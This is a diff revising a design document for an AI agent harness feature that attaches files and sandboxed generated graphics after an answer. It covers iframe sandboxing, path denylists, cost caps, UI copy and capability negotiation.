@@ -53,6 +53,11 @@ failed, and the HTML is untrusted on every surface.
 - User-facing: **"Highlights"**. The row header reads "Highlights" (files plus graphics); the
   loading line reads "Preparing highlights…". The operator's own wording, "generating
   supporting graphics", is the fallback if design prefers it.
+- Two conditions ride the name (round-1 design review D6): (a) the settled row always names its
+  contents — counts and names (`2 files · 1 graphic`), never the bare word; (b) no new
+  text-selection copy in the same window says "highlight", so the two senses cannot drift.
+- "Highlights" stays the umbrella for the block; the files half reads as "Files" or as the
+  contents themselves, never as "supporting graphics".
 - Code name: keep **`supplement`**. Code reads `supplement`, `SupplementJob`, `supplement_v1`.
   The reason is that "supplement" names what the thing is to the turn (something attached
   after it), while "highlights" names what it is to the reader. Code needs the first and UI
@@ -89,10 +94,13 @@ by writing a new `supplement_v1` version. That version references the content-ad
 HTML blobs under the literal `"attachment"` key, so fork and move/sync carry them for free.
 
 Each surface renders the components in an **opaque-origin sandbox**: `allow-scripts` only,
-CSP `default-src 'none'`, no bridge. The host injects a vendored prelude (stylesheet, tiny
-chart/table helpers, resize and theme glue). Theme tokens are pushed by `postMessage`, so
-every theme and every live switch is covered without regenerating anything. The TUI renders
-file callouts and any image components, and silently skips HTML.
+CSP `default-src 'none'`, no bridge, and a per-surface **navigation guard** that allows the
+frame's initial load and denies every later navigation (Electron and native: stateful one-shot
+guards; relay web, which has no interception point for a subframe navigation: a parent-page CSP
+`frame-src data:` plus a second-`load` teardown — §4.1). The host injects a vendored prelude
+(stylesheet, tiny chart/table helpers, resize and theme glue). Theme tokens are pushed by
+`postMessage`, so every theme and every live switch is covered without regenerating anything.
+The TUI renders file callouts and any image components, and silently skips HTML.
 
 Cancel, steer and restart are three new runtime ops scoped to the job. None of them touches
 the turn.
@@ -130,7 +138,12 @@ each pipeline head (`session.py:13005`). So the session must **freeze the facts*
 needs onto the end event or onto a per-run record that `_emit` captures. Contract:
 `_emit` stores `self._last_run_provenance = RunProvenance(...)` beside
 `self._attention_outcome` (`session.py:12566`), and the subscriber reads it through a
-read-only accessor. It does **not** add a field to `AgentEndEvent`; `extra="allow"` would make
+read-only accessor. `RunProvenance` carries the **logical turn's accumulated messages** —
+every loop run of the pipeline (first run plus each `_drain_continuation` run,
+`session.py:13831`), accumulated beside `_logical_generation` — because the held end is
+replaced per run (`self._held_end = event`, `session.py:13496`) and would otherwise leave only
+the LAST run's messages (round-1 review R2). It does **not** add a field to
+`AgentEndEvent`; `extra="allow"` would make
 that harmless (`types.py:1893`), but it would leak a private fact onto every viewer's wire.
 
 **Ordering against notifications is structural.** `_flush_held_end` emits the end
@@ -195,7 +208,7 @@ Both stamp `provider_payload[RENDERED_INJECTION_KEY]` (`session.py:8155`, `:8267
 | Goal-loop / judge continuation, spooled owner chrome | not eligible | `RENDERED_INJECTION_KEY` |
 | Spooled *real* owner prompt (sent during an update window) | eligible | `harness_injected` False on a typed spool row |
 | Subagent run | not eligible | `_job_id` |
-| `lop exec` text / `--json`, `run_print_mode` | not eligible | `_one_shot_exit` (rule 6). Exec stdout is the last assistant `MessageEnd` (`headless_print.py:260-265`), and supplements never emit `MessageEndEvent` (§2.7), so even with the rule removed exec's stdout would be byte-identical. |
+| `lop exec` text / `--json`, `run_print_mode` | not eligible | `_one_shot_exit` (rule 6). The text arm's stdout is the last assistant `MessageEnd` (`headless_print.py:260-265`); the `--json` arm dumps **every** event (`headless_print.py:209-218`), so rule 6 is load-bearing there, not belt-and-braces — §5.1 pins a no-`supplement_progress` assertion on it (round-1 review R7). |
 | SDK `open_session(mode="own")` | **not eligible by default** | the SDK constructs `create_session` with no `ServingSessionHandle` (`sdk.py:584-590`), so the runtime subscriber (§2.1) is never installed. That absence is the contract: SDK event streams stay unchanged. |
 | SDK `deliver()` to a runtime / `lop send` | eligible only if it carries a typed `PromptErrand` | it rides the runtime's ordinary prompt path |
 
@@ -207,7 +220,10 @@ rule 6 excludes it.
 ### 2.3 The decision: pre-filter, then two typed questions on the existing grammar
 
 **Step 1 — deterministic pre-filter (no I/O beyond `stat`, ≤ 5 ms target).** Inputs: the
-emitted end's `messages` (this run only) plus the run's user text.
+**logical turn's** messages — every loop run of the pipeline's accumulated `new_messages`
+(first run plus all continuations), read from `RunProvenance` (§2.1) — plus the run's user
+text. A turn that compacted and auto-continued therefore keeps its pre-compaction tool
+results and file writes, which the held end alone would lose (round-1 review R2).
 
 - **File candidates.** Paths appear in exactly three places:
   - `write`/`edit` tool-call args (key evidence);
@@ -223,7 +239,9 @@ emitted end's `messages` (this run only) plus the run's user text.
   - the config dir;
   - `/tmp`, `$TMPDIR`;
   - `.git/`, `node_modules/`, `.venv/`, `__pycache__/`, `.pytest_cache/`, `dist/`, `build/`;
-  - `*.log`, `*.lock`, `*.pyc`.
+  - `*.log`, `*.lock`, `*.pyc`;
+  - any operator-configured deny prefix (`supplements.denyPrefixes`, §2.12) — the knob that
+    makes the feature adoption-safe on a machine holding customer data (round-1 S-R8).
 - **The sensitive denylist (§4.3)**, applied here before anything is listed, sent, or
   previewed.
 - **Dedup against visible.** Drop a candidate whose path string appears verbatim in the
@@ -249,13 +267,15 @@ emitted end's `messages` (this run only) plus the run's user text.
   `none` (`classification/recommend.py` docstring, `:1-30`).
   - **Contract here:** one `choice` question `supplement_files` with options
     `f1..fN` (N ≤ 12, the recommend layer's `maxCandidates` scale) plus `none`. The option
-    text is the path's basename, its relative directory, its size, the tool that wrote it,
-    and the writing tool call's one-line intent. All of it is harness-derived text (the
+    text is the path's basename, its size, the tool that wrote it, and the writing tool
+    call's one-line intent — **no directory** (the relative directory is the field that would
+    carry the operator's client and project names to the decision vendor, and it does not
+    help judge "is this the deliverable?"; round-1 security S-R8). All of it is harness-derived text (the
     classification-layer §6 rail: option text must be harness-owned,
     `classification-layer.md:421-427`).
   - **Featured set** = the chosen id **plus** every option whose probability is
     ≥ `FILE_PROB_FLOOR` (0.25) and ≥ ½ of the top probability, minus `none`, capped at
-    `MAX_FEATURED` (4). The remainder is shown as "N more" (§2.7).
+    `MAX_FEATURED` (4). The remainder is shown as "N more" (§2.8).
   - If `none` wins with p ≥ 0.5 → no files.
 - **Graphics:** one `noul` question `supplement_graphics`, criteria
   `{"true": "...", "false": "..."}`. The rubric goes in the option descriptions (the measured
@@ -311,15 +331,18 @@ Reasons:
   "anchor": "<final assistant message id>",   // the attention anchor (session.py:11943)
   "job": "<job id, 12 hex>",                   // stable across versions of one anchor
   "version": 1,                                // 1..n; the newest version per anchor wins
-  "state": "decided|queued|running|done|failed|cancelled|skipped",
-  "files": [ {"path": "/abs/path", "name": "report.md", "kind": "markdown",
+  "state": "decided|queued|done|failed|cancelled|skipped",  // "running"/"cancelling" are live-only events, never journaled
+  "files": [ {"path": "rel/report.md", "name": "report.md", "kind": "markdown",
               "size_bytes": 4120, "mtime": 1791..., "why": "written by write"} ],
+              // paths are session-relative (or ~/-relative), resolved against the session
+              // cwd at render time; never absolute, so the operator's directory layout does
+              // not replicate to peers and the mesh (round-1 security S-R14)
   "files_more": 3,                             // the "N more" count; paths stored in "more"
-  "more": ["/abs/…", "…"],                     // ≤ 20, the same denylist applies
+  "more": ["rel/…", "…"],                     // ≤ 20, the same denylist applies; same relative form
   "components": [ {"attachment": "<32hex>",    // LITERAL KEY: network/sync.py:396 scans for it
                    "title": "Latency by region (ms)",
                    "source": "bench.csv rows 1-12 (tool result of bash at 10:41)",
-                   "mime": "text/html", "height_hint": 320} ],
+                   "mime": "text/html", "height_hint": 320} ],  // the validator clamps height_hint to [120, 480] at write time (R8)
   "images": [ {"attachment": "<32hex>", "mime": "image/png", "title": "…"} ],  // optional
   "decision": {"vendor": "radient", "files_p": {...}, "graphics_p": 0.83, "skipped": null},
   "instruction": "make it a table",            // steer text that produced this version
@@ -333,9 +356,17 @@ Reasons:
   (if graphics are coming) `state=queued`. File callouts therefore appear without waiting
   for the generator.
 - The generator's terminal write is `version=k, state=done|failed|cancelled`.
-- Intermediate `running` states are **live-only events** (§2.8). They are never journaled,
+- Intermediate `running`/`cancelling` **live-only event values** are never journaled,
   following image-gen's live-only progress precedent (`tools/image_tool.py:281-282`
-  *(scout)*).
+  *(scout)*). The row's `state` enum carries only journaled values; readers map live
+  transitions onto the same vocabulary (round-1 R10).
+
+**Stale-row reader rule (frozen in C0).** A surface that reads the newest row for an anchor
+whose `job` is not live in this runtime — the reaper cut it, or the reader is a cold one
+(history page, reopened app) — renders a non-terminal row (`decided`/`queued`) as
+`cancelled · Retry`; a row carrying `error="superseded"` renders nothing (§2.8). Live-state
+knowledge is the runtime's `_supplement_task` registry. C0 ships the fixture `state=queued`,
+no live job, that every lane asserts against (round-1 review R4).
 
 **Blobs.** Component HTML (the generated body *without* the prelude, §2.6) is stored with
 `AttachmentStore.put_bytes(raw, "text/html")` (`session/attachments.py:167-199`). That is
@@ -394,9 +425,9 @@ in the fork is a new `job` id. Nothing else is needed.
 
 Why isolated: the generator needs the **evidence**, not the conversation. A warm-prefix
 request would put a design prompt in the session's cache lineage, and on a different model
-there is no prefix to share anyway. The system prompt is the Appendix A text: **838 o200k
-tokens** (835 cl100k), measured with tiktoken 0.14 on the draft. It is cache-stable across
-jobs.
+there is no prefix to share anyway. The system prompt is the Appendix A text: **972 o200k
+tokens** (968 cl100k), measured with tiktoken 0.14 on this exact text. It is cache-stable
+across jobs.
 
 **Evidence.** The generator is given only:
 - the user message (≤ 2k chars);
@@ -421,8 +452,10 @@ process, the same redaction boundary classification-layer §6 requires for outbo
 - `TIMEOUT_S` 90 s wall for the whole job;
 - `MAX_OUTPUT_TOKENS` 6000 per turn;
 - `MAX_COMPONENTS` 3;
-- `MAX_JOB_COST_USD` 0.05, a soft cap checked between turns against the ledger-priced
-  snapshot.
+- `MAX_JOB_COST_USD` 0.20, a soft cap checked between turns against the ledger-priced
+  snapshot. The cap must clear the worst single turn (≈ $0.05) so the repair turn can start;
+  0.20 = 2 × the $0.08 high end of the measured job envelope + repair headroom (§5.3;
+  round-1 review R3).
 Any bound firing → `state=failed`, `error="bound:<name>"`, with valid blocks so far kept.
 
 **Fail-open.** Every exception → `failed`, a debug log, and no notice. A generator failure is
@@ -437,11 +470,12 @@ unless it has to.**
 The prelude is:
 - `prelude.css`: token defaults, typography, table/SVG styles, the series palette as
   `--s1..--s6` per mode, and reduced motion;
-- `prelude.js`: `LO.table/bar/line/el/fmt/color/onTheme/size`, plus the resize and theme
-  listener.
+- `prelude.js`: `LO.table/bar/line/el/fmt/color/onTheme/onSize/size`, plus the width-redraw
+  and theme listener.
 
-Measured on a working spike (Appendix C): **1,959 B CSS + 6,511 B JS raw; 3,741 B gzip
-combined. Budget: ≤ 10 KB raw, ≤ 4 KB gzip.**
+Measured on a working spike (Appendix C), after the round-1 updates — **2,045 B CSS +
+7,089 B JS raw (minified build); 4,067 B gzip combined. Budget: ≤ 10 KB raw, ≤ 4 KB
+gzip — both hold, with 29 B of gzip headroom; any addition must re-measure.**
 
 Trade-offs:
 
@@ -486,14 +520,19 @@ release.
 
 `vars` holds **resolved values** from `getComputedStyle` (UI and relay) or `PALETTE[mode]`
 (native, `ui/tokens.gen.ts:84`). It never carries a palette id, because native has only
-light/dark (scout risk 11). The prelude whitelists `--lo-*`/`--font-*` names and caps each
-value at 120 chars. It hides the document until the first theme arrives, falling back to
-`prefers-color-scheme` after 400 ms so there is no flash.
+light/dark (scout risk 11). Hosts post only names matching the `--lo-*`/`--font-*` shape and
+values from their own token set; the frame applies values through the CSSOM behind a
+`CSS.supports` gate — never interpolated into a `<style>` text node (round-1 security
+S-R13) — whitelists the names, and caps each value at 120 chars. The frame also pins its own
+ground to the pushed mode: `color-scheme` follows `data-mode` in the vendored CSS, so the UA
+canvas never stays on the OS scheme under host light vars (round-1 design D8). The document
+stays hidden until the first theme arrives; the `prefers-color-scheme` fallback after 400 ms
+is a last resort, not the plan.
 
 **The series palette** (Appendix B) is prelude-owned, so no UI palette-contract change is
 needed for v1. It was checked against every UI theme (59) and every relay theme (31):
-- non-text contrast ≥ 3.29:1 (light) and ≥ 4.08:1 (dark) on canvas/surface/elevated/
-  message-surface;
+- non-text contrast ≥ 3.29:1 (light) and ≥ 4.08:1 (dark) on the four supplement grounds
+  (canvas/surface/elevated/message-surface — `sunken` is excluded: Appendix B, round-1 D11);
 - CVD separation ΔE76 ≥ 9.7 under deutan/protan/tritan simulation;
 - meaning is never carried by colour alone (labels and dash patterns, Appendix A).
 
@@ -537,9 +576,15 @@ class SupplementProgressEvent(AgentEvent[Literal["supplement_progress"]]):
   (`desktop_sessions.py:2125-2140`), because the family is self-replacing by construction.
 
 **Capability strings.**
-- `supplements-v1`: a viewer that renders them. Advertised by the UI/relay/native in attach
-  negotiation, and as `features.supplements: 1` in `GET /v1/capabilities`
-  (`server/features.py:24-38`).
+- `supplements-v1`: a viewer that renders them. The attach gate is **two halves**: the
+  runtime's owner-record capability list (assembled beside `display-history-audit-v1`,
+  `session/runtime/server.py:2162-2163`) ANDed with the viewer's own boolean on its auth
+  frame (`session/runtime/server.py:3754-3773` is the exact pattern). The desktop live path
+  negotiates by route query param instead (`server/routes/desktop_sessions.py:4827-4842`, the
+  `frontend_replace`/`entry_ts` shape), and relay/attach clients read the owner's list
+  (`mobile/attach_client.py:1196-1208`). `features.supplements: 1` in `GET /v1/capabilities`
+  (`server/features.py:24-38`) stays the static HTTP flag — it is not the attach gate
+  (round-1 review R5).
 - The runtime **always journals** rows (they are custom entries, which display windows do
   not carry). Only the **live events and the history projection** are gated, which avoids
   the `DisplayHistoryWindow` `extra="forbid"` trap (`history_window.py:39-60,79-80`):
@@ -564,16 +609,22 @@ class SupplementProgressEvent(AgentEvent[Literal["supplement_progress"]]):
   and (c) the digest being referenced by that session's journal (one `rfind` per
   `supplement_v1` row; a probe measures cost). It is digest-keyed, so it is `immutable`.
 - Relay file-preview route for callouts: `GET /api/sessions/{sid}/supplements/{job}/file?i=<n>`
-  → bytes with a sniffed mime, **only** for the indices recorded in the row (no
-  client-chosen path). It re-applies the §4.3 denylist and a 10 MB cap, and refuses for a
-  remote-hosted session. Text/markdown/CSV/image/PDF only.
+  → bytes with a `Content-Type` **from an allowlist** (text/markdown/CSV/JSON/image/PDF;
+  never `text/html`, `image/svg+xml`, `application/xhtml+xml`, or any `+xml`), `nosniff`
+  always, and `Content-Disposition: attachment` for every non-image class. **Only** for the
+  indices recorded in the row (no client-chosen path); it re-applies the §4.3 denylist and a
+  10 MB cap, and refuses for a remote-hosted session. Bytes render in-app — nothing navigates
+  a browsing context to this route (§3.4). Note the tunnel forwards a fixed header set, so
+  the frame-level CSP (§4.1) is the guarantee that does not depend on these headers surviving
+  (round-1 security S-R6).
 - Desktop has local IPC for files (UI `index.ts:2561-2815` *(scout)*) and needs no new
   route for local sessions.
 
 **Tunnel header stripping is not a problem by design.** The gateway forwards a fixed
 response-header set (`tunnels/gateway.py:320-329`) and overwrites CSP with
-`frame-ancestors 'none'` (`:668-671`). The frame CSP rides **inside the document** (`<meta>`)
-plus the iframe `csp` attribute where supported, so no response header is relied on.
+`frame-ancestors 'none'` (`:668-671`). The frame CSP rides **inside the document** (`<meta>`);
+the iframe `csp` attribute is not used — it is not implemented in Chromium (round-1 review),
+so no response header and no unimplemented attribute is relied on.
 
 **Control ops (new; runtime dispatch, `session/runtime/server.py` after `:7115`):**
 
@@ -600,15 +651,29 @@ attaches to the right answer on every surface.
 `queued → running → (cancelling) → done | failed | cancelled`, with `decided` meaning "files
 known, graphics queued" (which paints as `queued`).
 
-**Copy and placement:**
-- One line directly under the answer's turn foot: `◌ Preparing highlights… · Cancel`.
-- Steer is an inline "Adjust…" affordance, revealed on hover/focus on desktop and as a tap
-  target on mobile.
-- Settled states: `done` replaces the line with the Highlights block; `failed` reads
-  "Couldn't prepare highlights · Retry"; `cancelled` reads "Highlights cancelled · Retry"
-  (neutral ink, never error ink). `skipped`/dismissed shows nothing.
+**Copy and placement (one copy table; round-1 design D7/D10):**
+
+| state | line |
+|---|---|
+| preparing (`decided`/`queued`/`running`) | `◌ Preparing highlights… · Adjust… · Cancel` |
+| done | the line is replaced by the block (below) |
+| user cancel (`cancelled`, no error or a non-`superseded` error) | `Highlights cancelled · Retry` (neutral ink, never error ink) |
+| superseded (`error="superseded"`) | nothing — the line disappears silently; no Retry under an answer the user moved past |
+| failure (any other error) | `Couldn't prepare highlights · Retry` |
+| frame-level `{t:"error"}` or a torn-down frame (§4.1) | the frame is replaced by one quiet line, `Couldn't render this graphic`; a `supplement_restart` Retry is offered when the job is settled |
+| `skipped`/dismissed | nothing |
+
+Steer and cancel render as a **pair** — `Adjust…` · `Cancel`, one `text-meta`/`ink-dim` line — never one hover-only while the other persists; on touch surfaces both are visible, tap targets ≥ 44 px (D10).
+
+**Block anatomy (round-1 design D1).**
+- Files-only with ≤ 2 files and no components: **one line, no header** — the contents themselves (`2 files: report.md, bench.csv`), never the bare word "Highlights" (§0).
+- Otherwise: the header line ("Highlights", always with counts and names), up to `MAX_FEATURED` file rows, the "N more" affordance — **expand in place, bounded at the stored ≤ 20** — then components.
+- **Aggregate frame budget:** frames mount automatically only within a cumulative `min(480 px, 40 vh)` of block height; anything beyond (MAX_COMPONENTS is 3) sits behind one disclosure (`Show all N graphics`) that expands in place on an explicit user action. Each frame still answers to its own [120, 480] clamp (§2.11).
+- **Condensed turns:** the block condenses with its turn — one line, **no frames mounted while condensed** — and restores on expand (§2.11). A `done` row with zero components and zero files renders **nothing** (no header, no reserved frame space); a files-only finish reserves no frame space.
+- **Captions, one place (D13):** the helper prints the component title and unit inside the document (D2, App. A); the host chrome renders exactly one `Source: …` line (§2.10); a model-supplied in-document `caption` is suppressed where it would restate the source. The reserved box carries the title as its label while the document loads.
 - `branding.md` §7 (one quiet line, not a card, UI `branding.md:837-896` *(scout)*): the
-  indicator is a line. The settled block is content, not chrome.
+  indicator is a line. The settled block is content, not chrome; the frame stays borderless
+  and transparent (Appendix B).
 - **Rows are load-bearing** (AGENTS.md TUI conventions *(scout)*): the TUI reserves the
   indicator row from `decided` onward and swaps it in place.
 - Shimmer obeys `display.shimmer`/`LOCAL_OPERATOR_NO_SHIMMER` (`tui/imagegen.py:30-34`
@@ -642,7 +707,9 @@ task per session. Rules:
   - Dispose cancels `_supplement_task` beside `_completion_task` (`serving.py:1555-1565`).
   - A cut job leaves `decided`/`queued` as its last durable state. On the next attach, a
     surface reading a non-terminal newest row whose `job` is not live in this runtime shows
-    it as **`cancelled · Retry`** (a reader rule, so no resume-time write is needed).
+    it as **`cancelled · Retry`** (a reader rule, so no resume-time write is needed — the
+    full rule and its C0 fixture are in §2.4). A row whose `error` is `superseded` renders
+    nothing (round-1 design D7; §2.8 copy table).
   - `is_pristine` is unaffected (the rearm-probe lesson, `serving.py:3694-3708`).
 - **Next turn: never delayed.** The job holds no session lock and never touches `_context`.
   It reads the end event's messages and the journal, and writes through `append_custom`,
@@ -664,21 +731,40 @@ task per session. Rules:
   validator recomputes them. Anything else fails validation → repair turn → drop.
 - Inline numeric literals in component scripts beyond layout constants are rejected by a
   static scan (§4.2): `\d{3,}` outside `viewBox`/style is a reject reason.
-- Every component carries `source` (required). Surfaces render it as a caption line:
-  "Source: bench.csv (rows 1-12)".
+- Every component carries `source` (required). Surfaces render it as one caption line,
+  `Source: bench.csv (rows 1-12)` — `text-meta`, `ink-muted`, single line, ellipsis with
+  the full text available; the caption idiom of §2.8 means chrome and a model `caption`
+  cannot double-render (round-1 design D13).
+- **Rendered values are checked, not just the data (round-1 design D4).** `LO.fmt` prints
+  each value at its own source precision by default; an explicit `digits` is the only way
+  fewer decimals appear (pinned by a prelude unit test, §5.1). The validator carries a
+  Python mirror of `LO.fmt` (same test vectors) and recomputes, from `<data>`, the numeric
+  strings the component displays **statically** (labels, captions, callouts); a mismatch —
+  including a baked-in rounded literal — is a repair reason.
 - **QA spot-check:** for 10 random `done` components from the golden run, QA opens the
-  `<data>` block and the cited source, and recomputes 3 values each by hand. Zero
-  mismatches is the bar (§5).
+  `<data>` block and the cited source, and recomputes 3 **displayed** values each by hand.
+  Zero mismatches is the bar (§5).
 
 ### 2.11 Lazy loading, fold and context
 
 - A component frame mounts only when its answer row is in the viewport (IntersectionObserver
   on web, `onViewableItemsChanged` on native). Documents are cached by digest in each
   surface's existing blob/URL cache (UI `blob-url-cache` *(scout)*).
-- Before the document resolves, a fixed **reserved box** of `height_hint` (clamped to
-  120-480 px) holds the space. A `resize` message may then shrink or grow it within
-  [80, 480] px, applied once per animation frame and **only when the row is below the
-  viewport's scroll anchor**. This avoids a scroll jump (UI `use-scroll-paging.ts` *(scout)*).
+- Before the document resolves, a fixed **reserved box** of `height_hint` holds the space.
+  `height_hint` is **clamped to [120, 480] px at write time by the validator** — the row
+  never carries anything outside, and the reserved box, the clamp and every later `resize`
+  all operate on that one range (round-1 review R8). A `resize` applies once per animation
+  frame and **only when the row is below the viewport's scroll anchor**. This avoids a
+  scroll jump (UI `use-scroll-paging.ts` *(scout)*).
+- **Width changes redraw (round-1 design D3).** A `ResizeObserver` on the document re-runs
+  every mounted helper on a width change (rAF-coalesced), so tick density, label thinning
+  and text keep their set sizes; raw DOM/SVG components receive `LO.onSize(fn)`. The helper
+  lays out natively down to the 220 px canvas-open column (216 px inner); below that floor —
+  not a supported surface — the SVG scales as a whole. Text never scales in supported
+  surfaces.
+- **Condensed turns:** the block condenses with its turn (one line) and **mounts no frames
+  while condensed**; expanding restores it. The aggregate frame budget the block mounts
+  against is `min(480 px, 40 vh)` (§2.8, round-1 D1).
 - **Outside the fold:** on the UI the Highlights row is a **statement** record placed after
   the answer, so the fold's trailing-statement walk keeps it visible (`isStatementRow`, UI
   `transcript-rows.ts:374-382`; `turn-segments.ts:504-514`). The new record kind
@@ -706,8 +792,9 @@ default constant beside its consumer and a `_consumer_defaults` entry (`AGENTS.m
 | `supplements.maxTurns` | int / `2` | 1..4 |
 | `supplements.maxOutputTokens` | int / `6000` | per generator turn |
 | `supplements.timeoutS` | int / `90` | whole job |
-| `supplements.maxCostUsd` | float / `0.05` | soft per-job cap |
+| `supplements.maxCostUsd` | float / `0.20` | soft per-job cap — clears the worst single turn so the repair turn can start; §5.3, round-1 R3 |
 | `supplements.maxFeatured` | int / `4` | the "N more" threshold |
+| `supplements.denyPrefixes` | list[str] / `[]` | paths under these prefixes are never candidate files — the adoption knob for a machine holding customer data (round-1 S-R8) |
 
 **Settings UIs.**
 - TUI `/settings` renders the section automatically (`settings_view.py:1215-1217` *(scout)*).
@@ -733,11 +820,11 @@ Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** =
 
 | # | Seam | File:line | Change | Disp. |
 |---|---|---|---|---|
-| 1 | Run provenance | `session.py:11733-11756` (`_note_run_input`), `:13005-13008` (reset) | add `_run_typed_user`, `_run_last_trigger`; freeze `RunProvenance` in `_emit` beside `_attention_outcome` (`:12566`) | C |
+| 1 | Run provenance | `session.py:11733-11756` (`_note_run_input`), `:13005-13008` (reset) | add `_run_typed_user`, `_run_last_trigger`; accumulate the logical turn's messages beside `_logical_generation` (R2); freeze `RunProvenance` in `_emit` beside `_attention_outcome` (`:12566`) | C |
 | 2 | Settled signal | pipeline `finally`, after `on_turn_settled` (`session.py:13076-13089`) | set `self._turn_settled` (an `asyncio.Event`); cleared at pipeline head | C |
 | 3 | Trigger | `serving.py:3100-3101` | `_maybe_supplement(event)` beside `_maybe_judge_goal`; schedules only | C |
 | 4 | Runner | new `session/runtime/supplements.py` (`SupplementRunner`) held as `_supplement_task` | cancel on dispose (`serving.py:1555-1565`); NOT in `_background_tasks` | C |
-| 5 | Pre-filter + candidates + denylist | new `local_operator/supplements/{candidates,evidence,denylist}.py` | pure; unit-tested | C |
+| 5 | Pre-filter + candidates + denylist | new `local_operator/supplements/{candidates,evidence,denylist}.py` | pure; unit-tested; inputs are the logical-turn messages (§2.3, R2) | C |
 | 6 | Decision | `classification/service.py:399` `decide` | two questions in `supplements/decision.py`; no service change in v1 | C/V |
 | 7 | Generator | `supplements/generator.py`; request shape from `_errand_request` (`session.py:18278`) | new `Session.complete_supplement(model, system, turns)` (isolated) or a module-level helper over the session's `_stream_fn` | C |
 | 8 | Validator | `supplements/validate.py` | parse, static scan, data provenance | C |
@@ -748,13 +835,13 @@ Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** =
 | 13 | Event | `harness/types.py` after `:2530`; `session/attached.py:586` `_EVENT_TYPES` | new class + registration | C |
 | 14 | Desktop bridge fold | `desktop_sessions.py:2125-2140` | add to keep-newest families | C |
 | 15 | Desktop route | `server/routes/desktop_sessions.py` near `:3466` | `…/supplements/{digest}/document`; 409 `attachment_on_peer` passthrough | C |
-| 16 | Capabilities | `server/features.py:38` | `"supplements": 1` | C |
+| 16 | Capabilities | `server/features.py:38`; `session/runtime/server.py:2162-2163` + `:3754-3773`; `routes/desktop_sessions.py:4827-4842` | `"supplements": 1` + the two-half attach gate (§2.7, R5) | C |
 | 17 | Runtime ops | `session/runtime/server.py:7097-7136` | `supplement_cancel/steer/restart/dismiss`, `supplements_for` | C |
 | 18 | Mobile projection | `mobile/projection.py:1877` (`fold_event`), `mobile/types.py:631` (`TranscriptEntry`) | new `kind:"supplement"` entry **only for viewers that negotiated `supplements-v1`** (old native shows unknown kinds visibly, scout finding 1); live state onto the entry | C |
 | 19 | Relay routes | `mobile/daemon.py:6636-6742` route table | `…/supplements/{digest}/document`, `…/supplements/{job}/file` | C |
 | 20 | Relay command ops | `mobile/daemon.py:5292-5316`, `mobile/types.py:209` | pass-through of the four ops | C |
 | 21 | Relay web | `mobile/web/src/components/transcript.tsx:183-219`, new `supplement-frame.tsx`, `lib/supplement.ts` | render; theme push; files list | C (mobile-relay lane) |
-| 22 | Config | `settings_io.py` (section + 9 settings), `tests/unit/test_settings_io.py` `_consumer_defaults` | §2.12 | C |
+| 22 | Config | `settings_io.py` (section + 10 settings), `tests/unit/test_settings_io.py` `_consumer_defaults` | §2.12 | C |
 | 23 | Kill switch | `supplements/policy.py` | §2.12 | C |
 | 24 | Usage label | `tui/widgets/session_panel.py:1742,1753` | purpose → "Highlights" | C |
 | 25 | Exec/SDK | `headless_print.py:260-265`, `sdk.py:584` | none (rule 6; no handle) | V |
@@ -766,7 +853,7 @@ Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** =
 |---|---|---|---|
 | T1 | Answer anchor | `tui/session_presentation.py:1572-1579` (`completion_anchor_id`) | a `SupplementBlock` mounted after the answer block with the same anchor; replay via `project_settled_rows` (`:916`) + `harness/rows.py` (one row decision, `rows.py` docstring) |
 | T2 | Live | `tui/app.py` event handler (over the 1 MB grep cap; probe P7 names the handler) | `supplement_progress` → reserve/swap the row |
-| T3 | Files | `tui/link_targets.py:81-86,254-261` (`_SCHEME`, `is_openable`) | **widen the guard to `file://` for paths a supplement row lists** — a separate `is_openable_file(url, allowed: set[str])` so the http(s) rule for prose is unchanged. Open via the existing `_open_link` worker (`app.py:22227`), with `open`/`xdg-open` on the path. Paint with `Style(link="file://…")`: Rich already emits OSC 8 for link styles (rich `style.py:716`, textual `strip.py:704`), so terminals that support OSC 8 get native links. Clicks still go through Textual's handler (`transcript.py:868-900`), and that handler is the effective path. No hyperlink-capability detection is needed, because an unsupporting terminal simply ignores OSC 8. |
+| T3 | Files | `tui/link_targets.py:81-86,254-261` (`_SCHEME`, `is_openable`) | **a file affordance, not a scheme widening** (round-1 security S-R2/S-R5): a separate `file_affordance(path)` that admits **regular files only** — suffix allowlist (text/markdown/CSV/TSV/JSON/image/PDF) + `stat` check, **never** `.app`/`.command`/`.sh`/`.scpt`/`.workflow`/`.pkg`/`.dmg`/`.terminal`/`.webloc`/`.inetloc`, an executable bit, a directory, or a symlink resolving outside the allowed roots (session cwd, `~`). Paint-time gating equals open-time gating: build the link with `Path.as_uri()` (percent-encoding for free — Rich/textual write `style._link` verbatim, `rich/style.py:716`, `textual/strip.py:704`, so interpolation is a terminal-escape injection), and pass every host-rendered string (file names, titles, captions, the "N more" line) through one `display_text()` helper that strips C0/C1 controls — one helper, not four habits (UI/native reuse the same fixture set). The click opens **Reveal in Finder** (`open -R`; never `webbrowser`); "open in default app" is a separate deliberate affordance. Clicks go through Textual's handler (`transcript.py:868-900`); terminals handle modifier-clicks themselves, which is why the guard must hold at paint time too. |
 | T4 | Images | `tui/session_presentation.py:1949` `append_image_blocks`; `tui/images.py:77` (8 live kitty images) | image components (if any) only; HTML → skipped, no placeholder |
 | T5 | Indicator | `tui/imagegen.py` pure fns | one reserved row; `ctrl+c` is NOT bound (it is the turn interrupt, `tool_card.py:189-190` *(scout)*); `/highlights cancel|retry|adjust <text>` slash commands instead |
 
@@ -779,8 +866,8 @@ Disposition: **C** = code in that lane's PR; **V** = verified (no code); **F** =
 | U3 | Fold | `transcript-rows.ts:374-382` `isStatementRow` | add `supplement`; must NOT become a `boundaryKindOf` pin |
 | U4 | Render | new `features/chat/canonical/supplement-row.tsx` after the foot (`canonical-transcript.tsx:1305-1360`) | files list + frames + indicator |
 | U5 | Frame | new `supplement-frame.tsx` | §4.1 desktop delivery |
-| U6 | Main-process guard | `src/main/index.ts` (main window, `:790-814`, `:969-1049`) | add `will-frame-navigate` deny for non-top frames whose URL is not `about:blank`/`about:srcdoc`; `setWindowOpenHandler` already denies non-auth |
-| U7 | CSP | `src/renderer/index.html:31-32` | `frame-src` keeps `blob:`? **No** — see §4.1; srcdoc needs none |
